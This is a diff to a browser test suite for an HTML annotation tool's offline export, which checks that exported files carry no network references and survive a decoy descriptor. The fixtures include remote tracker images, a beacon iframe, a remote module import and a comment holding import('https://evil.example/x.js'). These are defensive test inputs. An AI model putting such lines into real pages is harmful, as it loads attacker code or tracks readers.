@@ -10,6 +10,8 @@ import {
 const CONTENT = `
 <h1>Offline export</h1>
 <p id="offline-note">This paragraph proves embedded comments travel in the offline file.</p>
+<img id="remoteTracker" alt="Remote tracker" src="https://example.com/tracker.png" srcset="https://example.com/tracker-2x.png 2x">
+<iframe id="remoteFrame" title="Remote frame" src="https://example.com/beacon.html"></iframe>
 <pre class="mermaid cm-skip">
 flowchart LR
   A[Alpha] --> B[Beta]
@@ -39,6 +41,9 @@ flowchart LR
     }
   });
 })();
+</script>
+<script type="module">
+import "https://example.com/bare-module.js";
 </script>`;
 
 async function routeRichContentLocal(page) {
@@ -77,10 +82,40 @@ function makeTmpDir() {
   return fs.mkdtempSync(path.join(tmpRoot, "cmh_offline_"));
 }
 
+async function installDownloadTextCapture(page) {
+  await page.addInitScript(() => {
+    window.__cmhDownloadTexts = [];
+    const originalCreateObjectURL = URL.createObjectURL.bind(URL);
+    URL.createObjectURL = (blob) => {
+      if (blob && String(blob.type || "").includes("text/html")) {
+        blob.text().then((text) => window.__cmhDownloadTexts.push(text));
+      }
+      return originalCreateObjectURL(blob);
+    };
+  });
+}
+
+async function capturedDownloadText(page) {
+  await page.waitForFunction(() => window.__cmhDownloadTexts && window.__cmhDownloadTexts.length > 0);
+  return page.evaluate(() => window.__cmhDownloadTexts[window.__cmhDownloadTexts.length - 1]);
+}
+
 function layerDescriptor(html) {
-  const m = html.match(/<script\b[^>]*\bid=(["'])commentableHtmlLayer\1[^>]*>([\s\S]*?)<\/script>/i);
+  const m = html.match(/<script\b[^>]*\sid\s*=\s*(["'])commentableHtmlLayer\1[^>]*>([\s\S]*?)<\/script>/i);
   if (!m) throw new Error("missing layer descriptor");
   return JSON.parse(m[2]);
+}
+
+function realLayerDescriptorScripts(html) {
+  const head = html.slice(0, html.indexOf(CONTENT_BEGIN));
+  return [...head.matchAll(/<script\b[^>]*\sid\s*=\s*(["'])commentableHtmlLayer\1[^>]*>([\s\S]*?)<\/script>/gi)];
+}
+
+function insertLayerDecoy(html) {
+  const decoy = '<script type="application/json" data-id="commentableHtmlLayer">{"decoy":"keep"}</script>';
+  const marker = '<script type="application/json" id="commentableHtmlLayer">';
+  if (!html.includes(marker)) throw new Error("missing real layer descriptor marker");
+  return html.replace(marker, decoy + "\n" + marker);
 }
 
 const EXPECTED_LAYER_REGIONS = ["CSS", "HANDLED IDS", "EMBEDDED COMMENTS", "COMMENT UI", "JS"];
@@ -127,23 +162,44 @@ function expectForwardCompatibleContract(html, mode) {
   expect(html.indexOf("</main>", end)).toBeGreaterThan(end);
 }
 
+function mediaLoadAttributes(html) {
+  const refs = [];
+  const tagRe = /<(script|link|img|source|iframe|video|audio|object|embed)\b[^>]*>/gi;
+  for (const tag of html.matchAll(tagRe)) {
+    for (const attr of tag[0].matchAll(/\s(href|src|srcset|poster|data)\s*=\s*["']([^"']+)["']/gi)) {
+      refs.push({ tag: tag[1].toLowerCase(), attr: attr[1].toLowerCase(), value: attr[2] });
+    }
+  }
+  return refs;
+}
+
 function networkLoadRefs(html) {
   const refs = [];
-  for (const m of html.matchAll(/<(script|link|img|source|iframe|video|audio)\b[^>]*\b(?:href|src)=["']([^"']+)["'][^>]*>/gi)) {
-    if (/^(?:https?:)?\/\//i.test(m[2])) refs.push(m[2]);
+  for (const item of mediaLoadAttributes(html)) {
+    const values = item.attr === "srcset" ? item.value.split(",").map((part) => part.trim().split(/\s+/)[0]) : [item.value];
+    for (const value of values) {
+      if (/^(?:https?:)?\/\//i.test(value)) refs.push(value);
+    }
   }
   return refs;
 }
 
 test("Export Offline snapshots mermaid and Chart.js charts for zero-network reopen (CMH-OFFLINE-01, CMH-OFFLINE-02)", async ({ page, browser }) => {
   test.setTimeout(60000);
+  expect(networkLoadRefs(CONTENT)).toEqual(expect.arrayContaining([
+    "https://example.com/tracker.png",
+    "https://example.com/tracker-2x.png",
+    "https://example.com/beacon.html",
+  ]));
   const staged = stageContent(CONTENT, { key: "cmh-offline-export", source: "offline-export.html" });
+  fs.writeFileSync(staged.html, insertLayerDecoy(fs.readFileSync(staged.html, "utf8")));
   const server = await startStaticServer(staged.dir);
   const outDir = makeTmpDir();
   let ctx2;
   try {
     await routeRichContentLocal(page);
     await installClipboardCapture(page);
+    await installDownloadTextCapture(page);
     await page.goto(server.url + "/test-doc.html");
     await ready(page);
     await page.waitForFunction(() => !!document.querySelector("#commentRoot pre.mermaid svg"), null, { timeout: 20000 });
@@ -152,7 +208,7 @@ test("Export Offline snapshots mermaid and Chart.js charts for zero-network reop
     await openToolbarMenu(page);
     await expect(page.locator("#btnExportOfflineTop")).toBeVisible();
     await page.keyboard.press("Escape");
-    await addTextComment(page, "#offline-note", "offline note travels");
+    await addTextComment(page, "#offline-note", "offline note with import('https://evil.example/x.js') survives");
     await expect(page.locator("#btnExportOffline")).toBeVisible();
 
     const [download] = await Promise.all([
@@ -160,12 +216,16 @@ test("Export Offline snapshots mermaid and Chart.js charts for zero-network reop
       page.locator("#btnExportOffline").click(),
     ]);
     expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
-    const exportedHtml = await readDownload(download);
+    const exportedHtml = await capturedDownloadText(page);
     expectForwardCompatibleContract(exportedHtml, "offline");
+    expect(realLayerDescriptorScripts(exportedHtml)).toHaveLength(1);
+    expect(exportedHtml).toContain('<script type="application/json" data-id="commentableHtmlLayer">{"decoy":"keep"}</script>');
     expect(exportedHtml).toContain('id="embeddedComments"');
     expect(exportedHtml).toContain('data-cm-offline-chart="true"');
     expect(exportedHtml).not.toContain("cdn.jsdelivr.net/npm/mermaid");
     expect(exportedHtml).not.toContain("cdn.jsdelivr.net/npm/chart.js");
+    expect(exportedHtml).not.toContain("bare-module.js");
+    expect(networkLoadRefs(exportedHtml)).toEqual([]);
 
     const exportedPath = path.join(outDir, "offline-export.html");
     fs.writeFileSync(exportedPath, exportedHtml);
@@ -181,7 +241,20 @@ test("Export Offline snapshots mermaid and Chart.js charts for zero-network reop
     await page2.goto(fileUrl(exportedPath));
     await ready(page2);
     await expect(page2.locator("#cmTypeBadge")).toHaveText("Offline");
-    await expect(page2.locator("#commentList")).toContainText("offline note travels");
+    await expect(page2.locator("#commentList")).toContainText("offline note with import('https://evil.example/x.js') survives");
+
+    const mediaState = await page2.evaluate(() => {
+      const img = document.getElementById("remoteTracker");
+      const iframe = document.getElementById("remoteFrame");
+      return {
+        imgSrc: img && img.getAttribute("src"),
+        imgSrcset: img && img.getAttribute("srcset"),
+        iframeSrc: iframe && iframe.getAttribute("src"),
+      };
+    });
+    expect(mediaState.imgSrc || "").not.toMatch(/^(?:https?:)?\/\//i);
+    expect(mediaState.imgSrcset).toBeNull();
+    expect(mediaState.iframeSrc).toBeNull();
 
     const mermaid = page2.locator("#commentRoot pre.mermaid svg").first();
     await expect(mermaid).toBeVisible();
@@ -239,6 +312,7 @@ test("editing an already-offline document preserves offline mode and offline exp
     expect(layerDescriptor(portableHtml).mode).toBe("offline");
     expect(portableHtml).toContain("preserve this offline note");
     expect(portableHtml).toContain('data-cm-offline-chart="true"');
+    expect(mediaLoadAttributes(portableHtml).length).toBeGreaterThan(0);
     expect(networkLoadRefs(portableHtml)).toEqual([]);
 
     const [offlineDownload] = await Promise.all([
@@ -248,6 +322,7 @@ test("editing an already-offline document preserves offline mode and offline exp
     const offlineHtml = await readDownload(offlineDownload);
     expect(layerDescriptor(offlineHtml).mode).toBe("offline");
     expect((offlineHtml.match(/data-cm-offline-chart="true"/g) || []).length).toBe(1);
+    expect(mediaLoadAttributes(offlineHtml).length).toBeGreaterThan(0);
     expect(networkLoadRefs(offlineHtml)).toEqual([]);
     expect(offlineHtml).not.toContain('<canvas id="offlinePreservedChart"');
     expect(offlineHtml).toContain("preserve this offline note");
